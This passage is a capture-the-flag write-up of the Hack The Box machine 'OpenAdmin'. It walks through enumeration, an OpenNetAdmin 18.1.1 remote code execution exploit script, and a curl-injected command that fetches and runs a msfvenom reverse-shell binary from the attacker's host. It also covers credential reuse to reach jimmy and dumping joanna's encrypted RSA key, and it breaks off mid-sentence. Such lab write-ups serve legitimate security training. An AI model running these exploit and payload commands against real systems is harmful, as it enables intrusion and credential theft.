class=post-content><h2 id=ƒæó-info>≡ƒÆó Info<a hidden class=anchor aria-hidden=true href=#ƒæó-info>#</a></h2><h1></h1><ul><li><strong>Name:</strong> OpenAdmin</li><li><strong>Profile:</strong> <a href=https://www.hackthebox.eu/home/machines/profile/222>www.hackthebox.eu</a></li><li><strong>Difficulty:</strong> Easy</li><li><strong>OS:</strong> Linux</li><li><strong>Points:</strong> 20</li></ul><h1></h1><h3 id=overview>Overview<a hidden class=anchor aria-hidden=true href=#overview>#</a></h3><ul><li><strong>Network Enumeration</strong>: port 80, 22</li><li><strong>Web Application Enumeration</strong>: find <code>/ona/</code></li><li><strong>Web Application Exploitation</strong>: OpenNetAdmin RCE</li><li><strong>System enumeration and exploration in the jungle</strong>: mysql creds + 127.0.0.1:52846</li><li><strong>System Privilege Escalation : www-data to jimmy</strong>: credential stuffing</li><li><strong>System Privilege Escalation : jimmy to joanna</strong>: password crack</li><li><strong>System Privilege Escalation : joanna to root</strong>: nano escape</li></ul><h3 id=network-enumeration>Network Enumeration<a hidden class=anchor aria-hidden=true href=#network-enumeration>#</a></h3><p><strong>TL;DR</strong>: port 80, 22</p><p>Let&rsquo;s begin by finding open ports with a SYN <a href=https://nmap.org/>nmap</a> scan and then trying
to run default scripts and finding the version of those services.</p><pre tabindex=0><code>$ sudo nmap -p- -sS 10.10.10.171 -oA nmap_ports
[sudo] password for cyfun:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-13 10:45 CET
Nmap scan report for 10.10.10.171
Host is up (0.025s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 31.23 seconds

$ sudo nmap -p 80,22 -sSCV 10.10.10.171 -oA nmap_services
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-13 10:46 CET
Nmap scan report for 10.10.10.171
Host is up (0.024s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.89 seconds
</code></pre><p>As often, only a web app.</p><h3 id=web-application-enumeration>Web Application Enumeration<a hidden class=anchor aria-hidden=true href=#web-application-enumeration>#</a></h3><p><strong>TL;DR</strong>: find <code>/ona/</code></p><p>With a web directory finder like <a href=https://github.com/maurosoria/dirsearch>dirsearch</a> or <a href=https://github.com/ffuf/ffuf>ffuf</a> and a
good wordlist, we can try to enumerate the possible sub-folders.</p><pre tabindex=0><code>[14:04:59] 301 -  312B  - /music  -&gt;  http://10.10.10.171/music/
[14:05:01] 301 -  314B  - /artwork  -&gt;  http://10.10.10.171/artwork/
[14:05:04] 403 -  277B  - /server-status
[14:05:13] 301 -  313B  - /sierra  -&gt;  http://10.10.10.171/sierra/
</code></pre><p>Many rabbit hole sub-directories but on http://10.10.10.171/music/ there is a
login button leading to http://10.10.10.171/ona/ where is hosted an
OpenNetAdmin v18.1.1 instance.</p><p>We can see an alert message telling there is a newer version available and that
we have version 18.1.1 of <strong>OpenNetAdmin</strong>.</p><h3 id=web-application-exploitation>Web Application Exploitation<a hidden class=anchor aria-hidden=true href=#web-application-exploitation>#</a></h3><p><strong>TL;DR</strong>: OpenNetAdmin RCE</p><p>With the <a href=https://www.archlinux.org/packages/community/any/exploitdb/>Exploit-DB</a> tool <code>searchsploit</code> we search if there are
available exploits.</p><p><code>searchsploit OpenNetAdmin</code> shows there is a RCE for 18.1.1.</p><p>Note: I got some error with the exploit that was due to the EOL char, I copied
the exploit and converted CRLF to LF.</p><p>We just have to give the login URL to the exploit to get a pseudo-shell.</p><pre tabindex=0><code>bash 47691.sh http://10.10.10.171/ona/login.php
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
</code></pre><h3 id=system-enumeration-and-exploration-in-the-jungle>System enumeration and exploration in the jungle<a hidden class=anchor aria-hidden=true href=#system-enumeration-and-exploration-in-the-jungle>#</a></h3><p><strong>TL;DR</strong>: mysql creds + 127.0.0.1:52846</p><p>Let&rsquo;s try some basic commands and see if we can find something juicy.</p><pre tabindex=0><code>$ pwd
/opt/ona/www

$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
jimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bash
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
joanna:x:1001:1001:,,,:/home/joanna:/bin/bash

$ uname -a
Linux openadmin 4.15.0-70-generic #79-Ubuntu SMP Tue Nov 12 10:36:11 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
</code></pre><p>At some point I ran <code>linpeas.sh</code> (from <a href=https://github.com/carlospolop/PEASS-ng>PEASS suite</a>) and found there was
not only <code>/opt/ona/www</code> related to OpenNetAdmin but also <code>/var/www/html/ona</code>.</p><p>In there are the database credentials.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>$</span> <span style=color:#a6e22e>cat</span> <span style=color:#f92672>/</span><span style=color:#66d9ef>var</span><span style=color:#f92672>/</span><span style=color:#a6e22e>www</span><span style=color:#f92672>/</span><span style=color:#a6e22e>html</span><span style=color:#f92672>/</span><span style=color:#a6e22e>ona</span><span style=color:#f92672>/</span><span style=color:#a6e22e>local</span><span style=color:#f92672>/</span><span style=color:#a6e22e>config</span><span style=color:#f92672>/</span><span style=color:#a6e22e>database_settings</span><span style=color:#f92672>.</span><span style=color:#a6e22e>inc</span><span style=color:#f92672>.</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$ona_contexts<span style=color:#f92672>=</span><span style=color:#66d9ef>array</span> (
</span></span><span style=display:flex><span>  <span style=color:#e6db74>&#39;DEFAULT&#39;</span> <span style=color:#f92672>=&gt;</span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>array</span> (
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;databases&#39;</span> <span style=color:#f92672>=&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>array</span> (
</span></span><span style=display:flex><span>      <span style=color:#ae81ff>0</span> <span style=color:#f92672>=&gt;</span>
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>array</span> (
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;db_type&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;mysqli&#39;</span>,
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;db_host&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;localhost&#39;</span>,
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;db_login&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;ona_sys&#39;</span>,
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;db_passwd&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;n1nj4W4rri0R!&#39;</span>,
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;db_database&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;ona_default&#39;</span>,
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;db_debug&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#66d9ef>false</span>,
</span></span><span style=display:flex><span>      ),
</span></span><span style=display:flex><span>    ),
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;description&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;Default data context&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;context_color&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#e6db74>&#39;#D3DBFF&#39;</span>,
</span></span><span style=display:flex><span>  ),
</span></span><span style=display:flex><span>);
</span></span></code></pre></div><p>At some point I got bored of the pseudo-shell via the RCE exploit so I decided
to get a meterpreter reverse shell. A better reason is that we can&rsquo;t use
interactive client such a mysql client from the RCE so we need a real shell.</p><p>The RCE exploit is pretty simple:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e>#!/bin/bash
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>URL<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>${</span>1<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>while</span> true;<span style=color:#66d9ef>do</span>
</span></span><span style=display:flex><span> echo -n <span style=color:#e6db74>&#34;</span>$<span style=color:#e6db74> &#34;</span>; read cmd
</span></span><span style=display:flex><span> curl --silent -d <span style=color:#e6db74>&#34;xajax=window_submit&amp;xajaxr=1574117726710&amp;xajaxargs[]=tooltips&amp;xajaxargs[]=ip%3D%3E;echo \&#34;BEGIN\&#34;;</span><span style=color:#e6db74>${</span>cmd<span style=color:#e6db74>}</span><span style=color:#e6db74>;echo \&#34;END\&#34;&amp;xajaxargs[]=ping&#34;</span> <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>${</span>URL<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span> | sed -n -e <span style=color:#e6db74>&#39;/BEGIN/,/END/ p&#39;</span> | tail -n +2 | head -n -1
</span></span><span style=display:flex><span><span style=color:#66d9ef>done</span>
</span></span></code></pre></div><p>So to upload an execute my reverse shell I tried:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>curl --silent -d <span style=color:#e6db74>&#34;xajax=window_submit&amp;xajaxr=1574117726710&amp;xajaxargs[]=tooltips&amp;xajaxargs[]=ip%3D%3E;echo \&#34;BEGIN\&#34;;wget http://10.10.15.151:443/80.bin; chmod +x 80.bin; ./80.bin ;echo \&#34;END\&#34;&amp;xajaxargs[]=ping&#34;</span> <span style=color:#e6db74>&#34;http://10.10.10.171/ona/login.php&#34;</span> | sed -n -e <span style=color:#e6db74>&#39;/BEGIN/,/END/ p&#39;</span> | tail -n +2 | head -n -1
</span></span></code></pre></div><p>The shell wasn&rsquo;t executed because we can&rsquo;t <code>chmod +x</code> for whatever reason.</p><p>So I tried a trick to execute the shell:
<code>/lib64/ld-linux-x86-64.so.2 /opt/ona/www/80.bin</code> but it didn&rsquo;t work.</p><p>I found a quite useful article <a href=https://www.networkworld.com/article/3002286/what-can-you-do-when-you-cant-chmod-chmod.html>What can you do when you can&rsquo;t chmod chmod?</a>
were I learned about a command to copy the permissions of a binary.</p><p>So I used <code>getfacl</code> and <code>setfacl</code> to copy permissions from another binary.</p><pre tabindex=0><code>getfacl /bin/ls | setfacl --set-file=- 80.bin
</code></pre><p>It seems Meterpreter has an upstream bug with shell.</p><p>So in short here what I did to get my reverse shell:</p><pre tabindex=0><code># Attacker
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.15.151 LPORT=80 -f elf &gt; 80.bin

# Target
wget http://10.10.15.151:443/80.bin
getfacl /bin/ls | setfacl --set-file=- 80.bin
./80.bin
</code></pre><p>Listener + PTY:</p><pre tabindex=0><code>msf5 &gt; use exploit/multi/handler
msf5 exploit(multi/handler) &gt; set payload linux/x64/shell_reverse_tcp
payload =&gt; linux/x64/shell_reverse_tcp
msf5 exploit(multi/handler) &gt; set LPORT 80
LPORT =&gt; 80
msf5 exploit(multi/handler) &gt; set LHOST 10.10.15.151
LHOST =&gt; 10.10.15.151
msf5 exploit(multi/handler) &gt; run

python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;
</code></pre><p>Now we can use the interactive mysql client with the credentials we looted
earlier:</p><pre tabindex=0><code>www-data@openadmin:/opt/ona/www$ mysql -u ona_sys -p

mysql&gt; show tables;
show tables;
+------------------------+
| Tables_in_ona_default  |
+------------------------+
| blocks                 |
| configuration_types    |
| configurations         |
| custom_attribute_types |
| custom_attributes      |
| dcm_module_list        |
| device_types           |
| devices                |
| dhcp_failover_groups   |
| dhcp_option_entries    |
| dhcp_options           |
| dhcp_pools             |
| dhcp_server_subnets    |
| dns                    |
| dns_server_domains     |
| dns_views              |
| domains                |
| group_assignments      |
| groups                 |
| host_roles             |
| hosts                  |
| interface_clusters     |
| interfaces             |
| locations              |
| manufacturers          |
| messages               |
| models                 |
| ona_logs               |
| permission_assignments |
| permissions            |
| roles                  |
| sequences              |
| sessions               |
| subnet_types           |
| subnets                |
| sys_config             |
| tags                   |
| users                  |
| vlan_campuses          |
| vlans                  |
+------------------------+
40 rows in set (0.00 sec)

mysql&gt; select * from users;
select * from users;
+----+----------+----------------------------------+-------+---------------------+---------------------+
| id | username | password                         | level | ctime               | atime               |
+----+----------+----------------------------------+-------+---------------------+---------------------+
|  1 | guest    | 098f6bcd4621d373cade4e832627b4f6 |     0 | 2020-03-13 15:46:03 | 2020-03-13 15:46:03 |
|  2 | admin    | 21232f297a57a5a743894a0e4a801fc3 |     0 | 2020-03-13 15:45:04 | 2020-03-13 15:45:04 |
+----+----------+----------------------------------+-------+---------------------+---------------------+
2 rows in set (0.00 sec)
</code></pre><p>All of that was nearly useless because the password hash of the admin user is
the md5 of <code>admin</code> so we could have guessed it pretty easily.</p><p>With <code>ss -nlp</code> let list open sockets:</p><pre tabindex=0><code>tcp  LISTEN 0      80                                     127.0.0.1:3306                                            0.0.0.0:*
tcp  LISTEN 0      128                                    127.0.0.1:52846                                           0.0.0.0:*
tcp  LISTEN 0      128                                127.0.0.53%lo:53                                              0.0.0.0:*
tcp  LISTEN 0      128                                      0.0.0.0:22                                              0.0.0.0:*
tcp  LISTEN 14     128                                            *:80                                                    *:*
tcp  LISTEN 0      128                                         [::]:22                                                 [::]:*
</code></pre><p>We can see the public web server listening on all interfaces on port 80, the SSH
server, the internally exposed database on port 3306, but what&rsquo;s running on port
52846? Seems it&rsquo;s a web server.</p><p>The body looks like this:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>   &lt;<span style=color:#f92672>body</span>&gt;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>      &lt;<span style=color:#f92672>h2</span>&gt;Enter Username and Password&lt;/<span style=color:#f92672>h2</span>&gt;
</span></span><span style=display:flex><span>      &lt;<span style=color:#f92672>div</span> <span style=color:#a6e22e>class </span><span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;container form-signin&#34;</span>&gt;
</span></span><span style=display:flex><span>        &lt;<span style=color:#f92672>h2</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;featurette-heading&#34;</span>&gt;Login Restricted.&lt;<span style=color:#f92672>span</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;text-muted&#34;</span>&gt;&lt;/<span style=color:#f92672>span</span>&gt;&lt;/<span style=color:#f92672>h2</span>&gt;
</span></span><span style=display:flex><span>                &lt;/<span style=color:#f92672>div</span>&gt; <span style=color:#75715e>&lt;!-- /container --&gt;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>      &lt;<span style=color:#f92672>div</span> <span style=color:#a6e22e>class </span><span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;container&#34;</span>&gt;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>         &lt;<span style=color:#f92672>form</span> <span style=color:#a6e22e>class </span><span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;form-signin&#34;</span> <span style=color:#a6e22e>role </span><span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;form&#34;</span>
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>action </span><span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;/index.php&#34;</span> <span style=color:#a6e22e>method </span><span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;post&#34;</span>&gt;
</span></span><span style=display:flex><span>            &lt;<span style=color:#f92672>h4</span> <span style=color:#a6e22e>class </span><span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;form-signin-heading&#34;</span>&gt;&lt;/<span style=color:#f92672>h4</span>&gt;
</span></span><span style=display:flex><span>            &lt;<span style=color:#f92672>input</span> <span style=color:#a6e22e>type </span><span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;text&#34;</span> <span style=color:#a6e22e>class </span><span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;form-control&#34;</span>
</span></span><span style=display:flex><span>               <span style=color:#a6e22e>name </span><span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;username&#34;</span>
</span></span><span style=display:flex><span>               <span style=color:#a6e22e>required</span> <span style=color:#a6e22e>autofocus</span>&gt;&lt;/<span style=color:#f92672>br</span>&gt;
</span></span><span style=display:flex><span>            &lt;<span style=color:#f92672>input</span> <span style=color:#a6e22e>type </span><span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;password&#34;</span> <span style=color:#a6e22e>class </span><span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;form-control&#34;</span>
</span></span><span style=display:flex><span>               <span style=color:#a6e22e>name </span><span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;password&#34;</span> <span style=color:#a6e22e>required</span>&gt;
</span></span><span style=display:flex><span>            &lt;<span style=color:#f92672>button</span> <span style=color:#a6e22e>class </span><span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;btn btn-lg btn-primary btn-block&#34;</span> <span style=color:#a6e22e>type </span><span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;submit&#34;</span>
</span></span><span style=display:flex><span>               <span style=color:#a6e22e>name </span><span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;login&#34;</span>&gt;Login&lt;/<span style=color:#f92672>button</span>&gt;
</span></span><span style=display:flex><span>         &lt;/<span style=color:#f92672>form</span>&gt;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>      &lt;/<span style=color:#f92672>div</span>&gt;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>   &lt;/<span style=color:#f92672>body</span>&gt;
</span></span></code></pre></div><p>There is a login page on 127.0.0.1:52846, let&rsquo;s try to login with the creds we
found on the database.</p><pre tabindex=0><code>curl -X POST http://127.0.0.1:52846/index.php --data &#39;username=admin&amp;password=admin&amp;login=Submit&#39;
</code></pre><p>I obtain a <code>Wrong username or password.</code> :(</p><p>But if take a look at the owner of the internal website, it seems it&rsquo;s jimmy:</p><pre tabindex=0><code>www-data@openadmin:/var/www$ ls -lh
ls -lh
total 8.0K
drwxr-xr-x 6 www-data www-data 4.0K Nov 22 15:59 html
drwxrwx--- 2 jimmy    internal 4.0K Mar 13 15:53 internal
lrwxrwxrwx 1 www-data www-data   12 Nov 21 16:07 ona -&gt; /opt/ona/www
</code></pre><h3 id=system-privilege-escalation--www-data-to-jimmy>System Privilege Escalation : www-data to jimmy<a hidden class=anchor aria-hidden=true href=#system-privilege-escalation--www-data-to-jimmy>#</a></h3><p><strong>TL;DR</strong>: credential stuffing</p><p>It could be helpful to read the source code but with <code>www-data</code> we are not in
the internal group so we need to connect as jimmy to read the source code.</p><p>A big guessing step involved here: we needed to re-use the MySQL <code>ona_sys</code> user
password (<code>n1nj4W4rri0R!</code>) as jimmy PAM password for ssh.
I think the idea was credentials stuffing if jimmy is the dev of the internal
web app he may have reused his own personal password for dev purpose like the
DB.</p><p>Now cen can connect and look at the source code:</p><pre tabindex=0><code>$ ssh jimmy@10.10.10.171

jimmy@openadmin:~$ ls -la /var/www/internal/
total 20
drwxrwx--- 2 jimmy internal 4096 Mar 13 15:53 .
drwxr-xr-x 4 root  root     4096 Nov 22 18:15 ..
-rwxrwxr-x 1 jimmy internal 3229 Nov 22 23:24 index.php
-rwxrwxr-x 1 jimmy internal  185 Nov 23 16:37 logout.php
lrwxrwxrwx 1 jimmy jimmy      17 Mar 13 15:53 lol -&gt; /var/www/html/lol
-rwxrwxr-x 1 jimmy internal  339 Nov 23 17:40 main.php
</code></pre><p>In <code>index.php</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>            $msg <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>isset</span>($_POST[<span style=color:#e6db74>&#39;login&#39;</span>]) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>!</span><span style=color:#66d9ef>empty</span>($_POST[<span style=color:#e6db74>&#39;username&#39;</span>]) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>!</span><span style=color:#66d9ef>empty</span>($_POST[<span style=color:#e6db74>&#39;password&#39;</span>])) {
</span></span><span style=display:flex><span>              <span style=color:#66d9ef>if</span> ($_POST[<span style=color:#e6db74>&#39;username&#39;</span>] <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;jimmy&#39;</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>hash</span>(<span style=color:#e6db74>&#39;sha512&#39;</span>,$_POST[<span style=color:#e6db74>&#39;password&#39;</span>]) <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1&#39;</span>) {
</span></span><span style=display:flex><span>                  $_SESSION[<span style=color:#e6db74>&#39;username&#39;</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;jimmy&#39;</span>;
</span></span><span style=display:flex><span>                  <span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#34;Location: /main.php&#34;</span>);
</span></span><span style=display:flex><span>              } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>                  $msg <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;Wrong username or password.&#39;</span>;
</span></span><span style=display:flex><span>              }
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>         <span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p>The password of jimmy (for the internal web app) is hardcoded and we can break
the SHA512 with an online service for example.</p><p><code>00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1</code> -> <code>Revealed</code></p><p>So we can connect as jimmy and be redirected to <code>main.php</code> (<code>header("Location: /main.php");</code>).</p><h3 id=system-privilege-escalation--jimmy-to-joanna>System Privilege Escalation : jimmy to joanna<a hidden class=anchor aria-hidden=true href=#system-privilege-escalation--jimmy-to-joanna>#</a></h3><p><strong>TL;DR</strong>: password crack</p><pre tabindex=0><code>$ curl -X POST http://127.0.0.1:52846/index.php --data &#39;username=jimmy&amp;password=Revealed&amp;login=Submit&#39;

$ curl -X POST http://127.0.0.1:52846/main.php
&lt;pre&gt;-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
-----END RSA PRIVATE KEY-----
&lt;/pre&gt;uid=1001(joanna) gid=1001(joanna) groups=1001(joanna),1002(internal)
&lt;html&gt;
&lt;h3&gt;Don&#39;t forget your &#34;ninja&#34; password&lt;/h3&gt;
Click here to logout &lt;a href=&#34;logout.php&#34; tite = &#34;Logout&#34;&gt;Session
&lt;/html&gt;
</code></pre><p>We could also have look at <code>main.php</code> directly on the file system too but I
wanted to follow the application logic.</p><p>It seems we have a private key from <code>joanna</code> user, which is encrypted and
